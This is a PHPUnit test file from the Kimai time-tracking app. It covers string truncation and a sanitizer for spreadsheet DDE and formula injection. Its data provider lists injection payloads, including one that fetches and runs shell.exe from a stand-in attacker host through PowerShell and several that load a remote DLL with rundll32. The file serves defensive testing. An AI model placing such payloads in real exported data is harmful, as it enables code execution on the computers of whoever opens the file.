<?php

/*
 * This file is part of the Kimai time-tracking app.
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace App\Tests\Utils;

use App\Utils\StringHelper;
use PHPUnit\Framework\TestCase;

/**
 * @covers \App\Utils\StringHelper
 */
class StringHelperTest extends TestCase
{
    public function testEnsureMaxLength(): void
    {
        self::assertNull(StringHelper::ensureMaxLength(null, 10));
        self::assertEquals('', StringHelper::ensureMaxLength('', 10));
        self::assertEquals(1, mb_strlen(StringHelper::ensureMaxLength('까깨꺄', 1)));
        self::assertEquals(3, mb_strlen(StringHelper::ensureMaxLength('까깨꺄', 10)));
        self::assertEquals(5, mb_strlen(StringHelper::ensureMaxLength('xxxxx', 10)));
        self::assertEquals(10, mb_strlen(StringHelper::ensureMaxLength('xxxxxxxxxx', 10)));
        self::assertEquals(10, mb_strlen(StringHelper::ensureMaxLength('까깨꺄꺠꺼께껴꼐꼬꽈sssss', 10)));
        self::assertEquals(10, mb_strlen(StringHelper::ensureMaxLength('까깨꺄꺠꺼께껴꼐꼬꽈꼬꽈', 10)));
    }

    public static function getDdeAttackStrings()
    {
        yield ['DDE ("cmd";"/C calc";"!A0")A0'];
        yield [' DDE ("cmd";"/C calc";"!A0")A0'];
        yield ["@SUM(1+9)*cmd|' /C calc'!A0"];
        yield ["-10+20+cmd|' /C calc'!A0"];
        yield ["+10+20+cmd|' /C calc'!A0"];
        yield ["=10+20+cmd|' /C calc'!A0"];
        yield ["=cmd|' /C notepad'!'A1'"];
        yield ["=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0"];
        yield ["=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
        yield ["	=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
        yield ["\t=10+20+cmd|' /C calc'!A0"];
        yield ["\r=10+20+cmd|' /C calc'!A0"];
        yield ["\n=10+20+cmd|' /C calc'!A0"];
        yield ["\r\n=10+20+cmd|' /C calc'!A0"];
        yield [PHP_EOL . "=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
    }

    /**
     * @dataProvider getDdeAttackStrings
     */
    public function testSanitizeDde(string $input): void
    {
        self::assertEquals("' " . $input, StringHelper::sanitizeDDE($input));
    }

    public static function getNonDdeAttackStrings()
    {
        yield [''];
        yield [' '];
    }

    /**
     * @dataProvider getNonDdeAttackStrings
     */
    public function testSanitizeDdeWithCorrectStrings(string $input): void
    {
        self::assertEquals($input, StringHelper::sanitizeDDE($input));
    }
}
